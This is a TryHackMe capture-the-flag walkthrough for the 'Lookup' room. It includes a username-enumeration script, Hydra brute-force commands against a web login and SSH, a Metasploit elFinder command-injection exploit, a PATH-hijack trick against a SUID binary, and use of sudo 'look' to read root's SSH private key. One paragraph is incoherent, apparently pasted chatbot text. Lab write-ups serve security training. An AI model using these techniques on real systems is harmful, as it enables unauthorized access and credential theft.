# Lookup — TryHackMe Walkthrough

## Enumeration

As part of my daily routine, I began with enumeration. First, I used **RustScan** to scan the ports and identified two open ports. Although **Nmap** provided additional results, those ports were closed. Therefore, our focus is on ports **22** and **80**.

I searched for CVEs related to the SSH and HTTP versions but didn’t find anything noteworthy. Moving forward, I attempted various enumeration tools such as subdomain enumeration and **Nikto** scans, but the results were inconclusive.

After adding `lookup.thm` to my `/etc/hosts` file, I accessed the webpage, which presented a login page.

## Login Page Enumeration

I attempted some default credentials and basic SQL injection techniques, but they were unsuccessful. Each attempt either resulted in errors or a redirection.

I decided to explore other directories beyond the login page to uncover additional entry points or hidden resources.

## Directory Exploration

The results from exploring directories weren’t very promising. However, during my observation, I noticed that login attempts yielded two different responses, which hinted that the usernames were being validated. From this, I confirmed that **admin** is a valid username.

## Brute-Forcing Usernames

I attempted to brute-force the password for **admin** using **Hydra**, but it turned out to be a waste of time. To optimize the process, I created a script with the help of GPT to identify other valid usernames:

```python
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
username_file = "/home/mystic/Downloads/test/htb/names.txt"  # Replace with your wordlist path

# Fixed password for testing
password = "password"

# Custom headers (optional)
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

# Function to send POST requests and process responses
def check_username(username):
    # Prepare the POST data
    data = {
        "username": username,
        "password": password
    }

    try:
        # Send the POST request
        response = requests.post(url, data=data, headers=headers)

        # Check the response content
        if "Wrong password" in response.text:
            print(f"Username found: {username}")
        elif "wrong username" in response.text:
            pass  # Silent continuation for wrong usernames
        else:
            print(f"[?] Unexpected response for username: {username}")
    except requests.RequestException as e:
        print(f"[!] Request failed for username {username}: {e}")

# Main function
if __name__ == "__main__":
    try:
        # Open the username file and read each line
        with open(username_file, "r") as file:
            for line in file:
                username = line.strip()
                if not username:
                    continue  # Skip empty lines

                check_username(username)
    except FileNotFoundError:
        print(f"[!] Wordlist file '{username_file}' not found!")
    except requests.RequestException as e:
        print(f"[!] An HTTP request error occurred: {e}")
```

### Outcome
The script successfully returned a valid username: **jose**.

## Password Brute-Forcing

Now, the journey continues as we focus on finding the password for **jose**:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:INcorrect" -V
```

Logged in as **jose**, I discovered a new subdomain. Make sure to add it to the `/etc/hosts` file to proceed.

## Subdomain Exploration

I searched through the files for any useful leads but found nothing significant. Finally, I focused on the file manager’s version to investigate potential exploits.

A quick search on **Searchsploit** revealed four exploits, with one appearing favorable for this scenario:

```bash
msfconsole
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

### Shell Access
Easy peasy! We successfully obtained a shell as **www-data**.

## Privilege Escalation

Inside the system, we have two additional users: **think** and **root**.

```bash
find / -perm -u=s -type f 2>/dev/null
```

During my search for privilege escalation opportunities, I came across an unexpected file located at `/usr/sbin/pwm`, which seemed interesting.

I was stuck for a while, so I called on my companion, GPT, for help. It provided me with a valuable lead.

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

Now it’s time to retrieve the correct password from the list of possible passwords. I will save the valid password into a file:

```bash
hydra -l think -P /home/mystic/Downloads/test/htb/password.txt -t 4 ssh://10.10.62.113
```

### User: Think
It looks like the room **Think** resembles one you might have done earlier, or perhaps even one I’ve worked on before as well. If you’re referring to a familiar path or challenge, it might be helpful to go back through your earlier steps or experiences to refresh your memory.

**Think** can use the `look` binary as sudo, which is useful for reading files. **GTFObin** might be helpful for this.

```bash
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

Save the `id_rsa` file and set the correct permissions with the command:

```bash
chmod 600 savedfilename
ssh -i savedfilename root@machineIP
```

## Root Access
We are **root**! 🎉

Both flags have been retrieved successfully.
